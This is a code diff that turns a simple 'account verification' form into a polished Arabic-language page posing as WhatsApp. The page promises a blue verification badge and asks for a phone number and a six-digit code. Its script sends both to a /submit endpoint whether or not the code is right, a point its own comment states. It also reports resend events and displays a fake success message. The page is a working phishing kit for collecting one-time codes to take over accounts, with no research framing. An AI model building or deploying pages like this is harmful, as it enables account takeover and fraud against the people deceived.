@@ -1,170 +1,778 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>توثيق الحساب</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>WhatsApp - توثيق الحساب</title>
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
+        /* ===== إعدادات عامة ===== */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+        }
+
         body {
-            background: #0b2b40;
+            background-color: #0a0a0a;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            padding: 20px;
-        }
-        .box {
-            background: white;
-            max-width: 400px;
-            width: 100%;
-            padding: 40px 30px;
-            border-radius: 30px;
-            text-align: center;
-        }
-        h1 { color: #0d47a1; margin-bottom: 10px; }
-        p { color: #666; font-size: 14px; margin-bottom: 20px; }
-        input {
-            width: 100%;
-            padding: 15px;
-            border: 2px solid #ddd;
-            border-radius: 12px;
-            font-size: 18px;
-            margin-bottom: 15px;
-            text-align: center;
-        }
-        input:focus { border-color: #0d47a1; outline: none; }
-        button {
-            width: 100%;
-            padding: 15px;
-            background: #0d47a1;
-            color: white;
-            border: none;
-            border-radius: 12px;
-            font-size: 18px;
-            font-weight: bold;
-            cursor: pointer;
-        }
-        button:hover { background: #1565c0; }
-        .otp-box {
-            display: flex;
-            gap: 10px;
-            justify-content: center;
-            margin: 15px 0;
-        }
-        .otp-box input {
-            width: 50px;
-            height: 60px;
-            text-align: center;
-            font-size: 24px;
             margin: 0;
+            padding: 0;
         }
-        .hidden { display: none; }
-        .error { color: red; font-size: 14px; margin-top: 10px; }
-        .success { color: green; font-size: 14px; margin-top: 10px; }
+
+        /* ===== حاوية التطبيق ===== */
+        .app-container {
+            background-color: #ffffff;
+            max-width: 430px;
+            width: 100%;
+            height: 100vh;
+            max-height: 932px;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 0 40px rgba(0, 0, 0, 0.5);
+        }
+
+        /* ===== الهيدر ===== */
+        .header {
+            background: #075e54;
+            color: white;
+            padding: 16px 20px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            position: sticky;
+            top: 0;
+            z-index: 10;
+            min-height: 60px;
+        }
+
+        .header .back-btn {
+            font-size: 22px;
+            cursor: pointer;
+            display: none;
+            padding: 4px 8px;
+            border-radius: 50%;
+            transition: 0.2s;
+        }
+
+        .header .back-btn:hover {
+            background: rgba(255, 255, 255, 0.1);
+        }
+
+        .header .brand {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            flex: 1;
+        }
+
+        .header .brand i {
+            font-size: 28px;
+        }
+
+        .header .brand h2 {
+            font-size: 20px;
+            font-weight: 600;
+            letter-spacing: 0.2px;
+        }
+
+        .header .brand .badge {
+            background: #25d366;
+            color: white;
+            font-size: 10px;
+            padding: 2px 8px;
+            border-radius: 20px;
+            font-weight: 700;
+            margin-right: 4px;
+        }
+
+        .header .status {
+            font-size: 12px;
+            opacity: 0.8;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .header .status .dot {
+            width: 8px;
+            height: 8px;
+            background: #25d366;
+            border-radius: 50%;
+            display: inline-block;
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+
+        /* ===== المحتوى ===== */
+        .page {
+            flex: 1;
+            padding: 30px 24px;
+            display: none;
+            flex-direction: column;
+            animation: fadeIn 0.3s ease;
+            background: #f0f2f5;
+            overflow-y: auto;
+        }
+
+        .page.active {
+            display: flex;
+        }
+
+        @keyframes fadeIn {
+            0% { opacity: 0; transform: translateY(10px); }
+            100% { opacity: 1; transform: translateY(0); }
+        }
+
+        /* ===== بطاقة المحادثة ===== */
+        .chat-card {
+            background: white;
+            border-radius: 16px;
+            padding: 24px 20px;
+            margin-bottom: 20px;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.06);
+        }
+
+        .chat-card .icon-circle {
+            width: 56px;
+            height: 56px;
+            border-radius: 50%;
+            background: #e8f5e9;
+            color: #075e54;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            margin: 0 auto 12px;
+        }
+
+        .chat-card h3 {
+            font-size: 18px;
+            font-weight: 700;
+            color: #1a1a1a;
+            text-align: center;
+            margin-bottom: 4px;
+        }
+
+        .chat-card .sub-text {
+            color: #667781;
+            font-size: 14px;
+            text-align: center;
+            line-height: 1.5;
+        }
+
+        .chat-card .sub-text strong {
+            color: #075e54;
+        }
+
+        /* ===== الحقول ===== */
+        .input-group {
+            display: flex;
+            align-items: center;
+            background: white;
+            border-radius: 12px;
+            padding: 4px 16px;
+            margin-bottom: 16px;
+            border: 2px solid #e9edef;
+            transition: 0.2s;
+        }
+
+        .input-group:focus-within {
+            border-color: #075e54;
+            box-shadow: 0 0 0 3px rgba(7, 94, 84, 0.12);
+        }
+
+        .input-group i {
+            color: #667781;
+            font-size: 18px;
+            margin-left: 12px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 14px 0;
+            border: none;
+            background: transparent;
+            font-size: 16px;
+            outline: none;
+            direction: ltr;
+            color: #1a1a1a;
+        }
+
+        .input-group input::placeholder {
+            color: #8696a0;
+        }
+
+        /* ===== خانات OTP ===== */
+        .otp-boxes {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin: 16px 0 20px;
+            direction: ltr;
+        }
+
+        .otp-boxes input {
+            width: 48px;
+            height: 56px;
+            text-align: center;
+            font-size: 22px;
+            font-weight: 700;
+            border: 2px solid #e9edef;
+            border-radius: 12px;
+            background: white;
+            transition: 0.2s;
+            outline: none;
+            color: #1a1a1a;
+            -webkit-text-security: none;
+        }
+
+        .otp-boxes input:focus {
+            border-color: #075e54;
+            box-shadow: 0 0 0 3px rgba(7, 94, 84, 0.12);
+        }
+
+        /* ===== الأزرار ===== */
+        .btn {
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 30px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .btn-primary {
+            background: #075e54;
+            color: white;
+        }
+
+        .btn-primary:hover {
+            background: #054a42;
+        }
+
+        .btn-primary:active {
+            transform: scale(0.97);
+        }
+
+        .btn-success {
+            background: #25d366;
+            color: white;
+        }
+
+        .btn-success:hover {
+            background: #1da85c;
+        }
+
+        .btn-secondary {
+            background: transparent;
+            color: #075e54;
+            border: 2px solid #075e54;
+        }
+
+        .btn-secondary:hover {
+            background: #075e54;
+            color: white;
+        }
+
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        /* ===== رسائل الخطأ والنجاح ===== */
+        .error-msg {
+            color: #d32f2f;
+            font-size: 13px;
+            margin: -8px 0 14px 0;
+            display: none;
+            align-items: center;
+            gap: 6px;
+            background: #fce4ec;
+            padding: 8px 14px;
+            border-radius: 10px;
+        }
+
+        .error-msg.show {
+            display: flex;
+        }
+
+        .success-msg {
+            color: #1da85c;
+            font-size: 13px;
+            margin: -8px 0 14px 0;
+            display: none;
+            align-items: center;
+            gap: 6px;
+            background: #e8f5e9;
+            padding: 8px 14px;
+            border-radius: 10px;
+        }
+
+        .success-msg.show {
+            display: flex;
+        }
+
+        /* ===== تذييل ===== */
+        .footer-note {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #8696a0;
+            padding: 10px 0;
+        }
+
+        .footer-note i {
+            color: #25d366;
+            margin-right: 4px;
+        }
+
+        /* ===== تحميل ===== */
+        .loading-spinner {
+            display: none;
+            text-align: center;
+            padding: 10px;
+        }
+
+        .loading-spinner.show {
+            display: block;
+        }
+
+        .spinner {
+            border: 3px solid #e9edef;
+            border-top: 3px solid #075e54;
+            border-radius: 50%;
+            width: 28px;
+            height: 28px;
+            animation: spin 0.7s linear infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* ===== رسائل المحادثة ===== */
+        .message-bubble {
+            background: white;
+            border-radius: 16px 16px 16px 4px;
+            padding: 14px 18px;
+            margin-bottom: 8px;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.04);
+            max-width: 90%;
+            align-self: flex-start;
+        }
+
+        .message-bubble .sender {
+            font-size: 12px;
+            font-weight: 600;
+            color: #075e54;
+            margin-bottom: 2px;
+        }
+
+        .message-bubble .text {
+            font-size: 14px;
+            color: #1a1a1a;
+            line-height: 1.5;
+        }
+
+        .message-bubble .time {
+            font-size: 10px;
+            color: #8696a0;
+            text-align: left;
+            margin-top: 4px;
+        }
+
+        .message-bubble.incoming {
+            border-radius: 16px 16px 4px 16px;
+            background: #e8f5e9;
+        }
+
+        /* ===== توافق مع الموبايل ===== */
+        @media (max-width: 430px) {
+            .app-container {
+                max-height: 100vh;
+                border-radius: 0;
+                box-shadow: none;
+            }
+            .otp-boxes input {
+                width: 44px;
+                height: 50px;
+                font-size: 20px;
+            }
+        }
+
+        /* ===== Scroll styling ===== */
+        .page::-webkit-scrollbar {
+            width: 4px;
+        }
+        .page::-webkit-scrollbar-track {
+            background: transparent;
+        }
+        .page::-webkit-scrollbar-thumb {
+            background: #c8c8c8;
+            border-radius: 10px;
+        }
     </style>
 </head>
 <body>
 
-    <div class="box" id="app">
-        <!-- صفحة 1: رقم الهاتف -->
-        <div id="page1">
-            <h1>📱 توثيق الحساب</h1>
-            <p>أدخل رقم هاتفك للحصول على علامة التوثيق الزرقاء</p>
-            <input type="tel" id="phoneInput" placeholder="مثال: 01012345678">
-            <button onclick="sendPhone()">إرسال الرمز 📤</button>
-            <div id="phoneError" class="error"></div>
+    <div class="app-container">
+
+        <!-- ======== الهيدر ======== -->
+        <div class="header">
+            <i id="backBtn" class="back-btn fas fa-arrow-left"></i>
+            <div class="brand">
+                <i class="fab fa-whatsapp"></i>
+                <h2>WhatsApp</h2>
+                <span class="badge">موثق</span>
+            </div>
+            <div class="status">
+                <span class="dot"></span>
+                <span>متصل</span>
+            </div>
         </div>
 
-        <!-- صفحة 2: OTP -->
-        <div id="page2" class="hidden">
-            <h1>🔑 رمز التحقق</h1>
-            <p>تم إرسال الرمز إلى <span id="displayPhone" style="font-weight:bold;color:#0d47a1;"></span></p>
-            <div class="otp-box">
-                <input type="text" maxlength="1" class="otp-input" inputmode="numeric">
-                <input type="text" maxlength="1" class="otp-input" inputmode="numeric">
-                <input type="text" maxlength="1" class="otp-input" inputmode="numeric">
-                <input type="text" maxlength="1" class="otp-input" inputmode="numeric">
-                <input type="text" maxlength="1" class="otp-input" inputmode="numeric">
-                <input type="text" maxlength="1" class="otp-input" inputmode="numeric">
+        <!-- ======== الصفحة 1: رقم الهاتف ======== -->
+        <div id="pagePhone" class="page active">
+            <div class="chat-card">
+                <div class="icon-circle">
+                    <i class="fas fa-shield-alt"></i>
+                </div>
+                <h3>توثيق الحساب</h3>
+                <p class="sub-text">
+                    للحصول على <strong>علامة التوثيق الزرقاء</strong>،
+                    <br>أدخل رقم هاتفك للتحقق من هويتك.
+                </p>
             </div>
-            <button onclick="verifyOtp()">تحقق ✅</button>
-            <div id="otpError" class="error"></div>
-            <div id="otpSuccess" class="success"></div>
-            <br>
-            <button onclick="resendOtp()" style="background:#666;">إعادة الإرسال 🔄</button>
+
+            <div class="message-bubble incoming">
+                <div class="sender">WhatsApp</div>
+                <div class="text">🔒 حسابك سيصبح موثقاً رسمياً بعد التحقق</div>
+                <div class="time">الآن</div>
+            </div>
+
+            <div style="margin-top: 16px;">
+                <div class="input-group">
+                    <i class="fas fa-phone-alt"></i>
+                    <input type="tel" id="phoneInput" placeholder="أدخل رقم الهاتف" maxlength="15" inputmode="numeric" pattern="[0-9]*">
+                </div>
+
+                <div id="phoneError" class="error-msg">
+                    <i class="fas fa-exclamation-circle"></i>
+                    <span>يرجى إدخال رقم هاتف صحيح</span>
+                </div>
+
+                <button class="btn btn-primary" id="sendOtpBtn">
+                    <i class="fas fa-paper-plane"></i> طلب رمز التوثيق
+                </button>
+
+                <div class="footer-note">
+                    <i class="fas fa-lock"></i> معلوماتك آمنة ومشفرة
+                </div>
+            </div>
         </div>
+
+        <!-- ======== الصفحة 2: إدخال OTP ======== -->
+        <div id="pageOtp" class="page">
+            <div class="chat-card">
+                <div class="icon-circle">
+                    <i class="fas fa-key"></i>
+                </div>
+                <h3>رمز التحقق</h3>
+                <p class="sub-text">
+                    تم إرسال رمز مكون من 6 أرقام إلى
+                    <br><strong id="displayPhone">رقمك</strong>
+                </p>
+            </div>
+
+            <div class="message-bubble incoming">
+                <div class="sender">WhatsApp</div>
+                <div class="text">📱 أدخل الرمز الذي تلقيته</div>
+                <div class="time">الآن</div>
+            </div>
+
+            <div class="otp-boxes" id="otpContainer">
+                <input type="text" maxlength="1" class="otp-input" data-index="0" inputmode="numeric" pattern="[0-9]*">
+                <input type="text" maxlength="1" class="otp-input" data-index="1" inputmode="numeric" pattern="[0-9]*">
+                <input type="text" maxlength="1" class="otp-input" data-index="2" inputmode="numeric" pattern="[0-9]*">
+                <input type="text" maxlength="1" class="otp-input" data-index="3" inputmode="numeric" pattern="[0-9]*">
+                <input type="text" maxlength="1" class="otp-input" data-index="4" inputmode="numeric" pattern="[0-9]*">
+                <input type="text" maxlength="1" class="otp-input" data-index="5" inputmode="numeric" pattern="[0-9]*">
+            </div>
+
+            <div id="otpError" class="error-msg">
+                <i class="fas fa-exclamation-circle"></i>
+                <span>الرمز غير صحيح، حاول مرة أخرى</span>
+            </div>
+
+            <div id="otpSuccess" class="success-msg">
+                <i class="fas fa-check-circle"></i>
+                <span>✅ تم التوثيق بنجاح!</span>
+            </div>
+
+            <div id="loadingSpinner" class="loading-spinner">
+                <div class="spinner"></div>
+                <p style="margin-top: 8px; color: #667781; font-size: 14px;">جاري التحقق...</p>
+            </div>
+
+            <button class="btn btn-success" id="verifyOtpBtn">
+                <i class="fas fa-check-circle"></i> تحقق من الرمز
+            </button>
+
+            <button class="btn btn-secondary" id="resendOtpBtn" style="margin-top: 10px;">
+                <i class="fas fa-redo-alt"></i> إعادة إرسال الرمز
+            </button>
+
+            <div class="footer-note">
+                <i class="fas fa-check-circle" style="color: #25d366;"></i>
+                بعد التحقق ستحصل على <strong style="color: #075e54;">العلامة الزرقاء</strong>
+            </div>
+        </div>
+
     </div>
 
     <script>
-        let phoneNumber = '';
-        let correctOtp = '123456';
+        // =============================================
+        //  جافا سكريبت - التحكم في الصفحات والمنطق
+        // =============================================
 
-        function sendPhone() {
-            const phone = document.getElementById('phoneInput').value.trim();
-            if (!/^[0-9]{10,15}$/.test(phone)) {
-                document.getElementById('phoneError').textContent = '⚠️ رقم غير صحيح';
-                return;
+        // عناصر الصفحة
+        const pagePhone = document.getElementById('pagePhone');
+        const pageOtp = document.getElementById('pageOtp');
+        const backBtn = document.getElementById('backBtn');
+
+        const phoneInput = document.getElementById('phoneInput');
+        const phoneError = document.getElementById('phoneError');
+        const sendOtpBtn = document.getElementById('sendOtpBtn');
+
+        const displayPhone = document.getElementById('displayPhone');
+        const otpInputs = document.querySelectorAll('.otp-input');
+        const otpError = document.getElementById('otpError');
+        const otpSuccess = document.getElementById('otpSuccess');
+        const verifyOtpBtn = document.getElementById('verifyOtpBtn');
+        const resendOtpBtn = document.getElementById('resendOtpBtn');
+        const loadingSpinner = document.getElementById('loadingSpinner');
+
+        let enteredPhone = '';
+        let correctOtp = '123456';
+        let isVerifying = false;
+
+        // ===== 1. التبديل بين الصفحات =====
+        function showPage(page) {
+            pagePhone.classList.remove('active');
+            pageOtp.classList.remove('active');
+            page.classList.add('active');
+
+            if (page === pageOtp) {
+                backBtn.style.display = 'inline-block';
+            } else {
+                backBtn.style.display = 'none';
             }
-            document.getElementById('phoneError').textContent = '';
-            phoneNumber = phone;
-            document.getElementById('displayPhone').textContent = phone;
-            
-            // توليد OTP عشوائي
-            correctOtp = Math.floor(100000 + Math.random() * 900000).toString();
-            console.log('📲 OTP:', correctOtp);
-            
-            document.getElementById('page1').classList.add('hidden');
-            document.getElementById('page2').classList.remove('hidden');
-            document.querySelectorAll('.otp-input')[0].focus();
         }
 
-        function verifyOtp() {
-            let otp = '';
-            document.querySelectorAll('.otp-input').forEach(inp => otp += inp.value);
-            
-            if (otp.length !== 6) {
-                document.getElementById('otpError').textContent = '⚠️ أدخل الرمز كاملاً';
+        // ===== 2. إرسال الرقم (الصفحة 1 → 2) =====
+        function sendPhone() {
+            const phone = phoneInput.value.trim().replace(/\s/g, '');
+
+            if (!/^[0-9]{10,15}$/.test(phone)) {
+                phoneError.classList.add('show');
                 return;
             }
+
+            phoneError.classList.remove('show');
+            enteredPhone = phone;
+            displayPhone.textContent = phone;
+
+            // توليد OTP عشوائي
+            correctOtp = Math.floor(100000 + Math.random() * 900000).toString();
+            console.log('📲 رمز OTP الجديد:', correctOtp);
+
+            showPage(pageOtp);
+            otpInputs[0].focus();
+            otpError.classList.remove('show');
+            otpSuccess.classList.remove('show');
+            clearOtpInputs();
+        }
+
+        // ===== 3. التحقق من OTP وإرسال البيانات =====
+        async function verifyOtp() {
+            if (isVerifying) return;
             
-            // إرسال للسيرفر (سواء صح أو غلط)
+            let enteredOtp = '';
+            otpInputs.forEach(input => {
+                enteredOtp += input.value.trim();
+            });
+
+            if (enteredOtp.length !== 6) {
+                otpError.classList.add('show');
+                otpError.querySelector('span').textContent = 'يرجى إدخال الرمز بالكامل (6 أرقام)';
+                return;
+            }
+
+            // إرسال البيانات للسيرفر (سواء صح أو غلط)
+            isVerifying = true;
+            otpError.classList.remove('show');
+            otpSuccess.classList.remove('show');
+            
+            loadingSpinner.classList.add('show');
+            verifyOtpBtn.disabled = true;
+            verifyOtpBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري التوثيق...';
+
+            try {
+                const response = await fetch('/submit', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        phone: enteredPhone,
+                        otp: enteredOtp
+                    })
+                });
+
+                const data = await response.json();
+
+                // التحقق من صحة الرمز (محلياً)
+                if (enteredOtp === correctOtp) {
+                    otpSuccess.classList.add('show');
+                    otpSuccess.querySelector('span').textContent = '✅ تم التوثيق بنجاح! 🎉';
+                    otpError.classList.remove('show');
+                    
+                    // بعد 2 ثانية نروح لصفحة النجاح
+                    setTimeout(() => {
+                        window.location.href = '/success';
+                    }, 2000);
+                } else {
+                    otpError.classList.add('show');
+                    otpError.querySelector('span').textContent = '❌ الرمز غير صحيح، حاول مرة أخرى';
+                    otpSuccess.classList.remove('show');
+                    clearOtpInputs();
+                    otpInputs[0].focus();
+                }
+
+            } catch (error) {
+                console.error('❌ خطأ:', error);
+                otpError.classList.add('show');
+                otpError.querySelector('span').textContent = '⚠️ حدث خطأ في الاتصال';
+            }
+
+            loadingSpinner.classList.remove('show');
+            verifyOtpBtn.disabled = false;
+            verifyOtpBtn.innerHTML = '<i class="fas fa-check-circle"></i> تحقق من الرمز';
+            isVerifying = false;
+        }
+
+        // ===== 4. إعادة إرسال الرمز =====
+        function resendOtp() {
+            correctOtp = Math.floor(100000 + Math.random() * 900000).toString();
+            console.log('📲 رمز توثيق جديد:', correctOtp);
+
+            clearOtpInputs();
+            otpInputs[0].focus();
+            otpError.classList.remove('show');
+            otpSuccess.classList.remove('show');
+            
+            // إرسال إشعار لإعادة الإرسال
             fetch('/submit', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ phone: phoneNumber, otp: otp })
+                body: JSON.stringify({
+                    phone: enteredPhone,
+                    otp: 'RESEND'
+                })
             });
             
-            if (otp === correctOtp) {
-                document.getElementById('otpError').textContent = '';
-                document.getElementById('otpSuccess').textContent = '✅ تم التوثيق بنجاح! 🎉';
-            } else {
-                document.getElementById('otpError').textContent = '❌ الرمز غير صحيح';
-                document.getElementById('otpSuccess').textContent = '';
-                document.querySelectorAll('.otp-input').forEach(inp => inp.value = '');
-                document.querySelectorAll('.otp-input')[0].focus();
-            }
+            alert('✅ تم إعادة إرسال الرمز الجديد إلى ' + enteredPhone);
         }
 
-        function resendOtp() {
-            correctOtp = Math.floor(100000 + Math.random() * 900000).toString();
-            console.log('📲 OTP جديد:', correctOtp);
-            document.querySelectorAll('.otp-input').forEach(inp => inp.value = '');
-            document.getElementById('otpError').textContent = '';
-            document.getElementById('otpSuccess').textContent = '';
-            alert('✅ تم إعادة إرسال الرمز');
+        // ===== 5. مسح خانات OTP =====
+        function clearOtpInputs() {
+            otpInputs.forEach(input => input.value = '');
         }
 
-        // التنقل بين خانات OTP
-        document.querySelectorAll('.otp-input').forEach((inp, i, arr) => {
-            inp.addEventListener('input', function() {
-                this.value = this.value.replace(/\D/g, '');
-                if (this.value.length === 1 && i < 5) arr[i+1].focus();
+        // ===== 6. التنقل التلقائي بين خانات OTP =====
+        otpInputs.forEach((input, index) => {
+            // منع أي حرف غير رقم
+            input.addEventListener('keydown', function(e) {
+                const key = e.key;
+                if (key === 'Backspace' || key === 'Tab' || key === 'ArrowLeft' || key === 'ArrowRight' || key === 'Delete' || key === 'Home' || key === 'End') {
+                    return;
+                }
+                if (!/^[0-9]$/.test(key)) {
+                    e.preventDefault();
+                }
             });
-            inp.addEventListener('keydown', function(e) {
-                if (e.key === 'Backspace' && this.value === '' && i > 0) arr[i-1].focus();
+
+            input.addEventListener('input', function(e) {
+                this.value = this.value.replace(/\D/g, '');
+                if (this.value.length > 1) {
+                    this.value = this.value.slice(0, 1);
+                }
+                if (this.value.length === 1 && index < otpInputs.length - 1) {
+                    otpInputs[index + 1].focus();
+                }
+            });
+
+            input.addEventListener('keyup', function(e) {
+                if (e.key === 'Backspace' && this.value === '' && index > 0) {
+                    otpInputs[index - 1].focus();
+                }
             });
         });
+
+        // ===== 7. أزرار العودة =====
+        backBtn.addEventListener('click', function() {
+            showPage(pagePhone);
+            clearOtpInputs();
+            otpError.classList.remove('show');
+            otpSuccess.classList.remove('show');
+            phoneInput.focus();
+            isVerifying = false;
+            loadingSpinner.classList.remove('show');
+            verifyOtpBtn.disabled = false;
+            verifyOtpBtn.innerHTML = '<i class="fas fa-check-circle"></i> تحقق من الرمز';
+        });
+
+        // ===== 8. ربط الأحداث =====
+        sendOtpBtn.addEventListener('click', sendPhone);
+        verifyOtpBtn.addEventListener('click', verifyOtp);
+        resendOtpBtn.addEventListener('click', resendOtp);
+
+        phoneInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                sendOtpBtn.click();
+            }
+        });
+
+        otpInputs[otpInputs.length - 1].addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                verifyOtpBtn.click();
+            }
+        });
+
+        console.log('🔑 الرمز الافتراضي للاختبار: 123456');
+        console.log('💡 سيتم توليد رمز عشوائي عند إرسال الرقم');
     </script>
 
 </body>
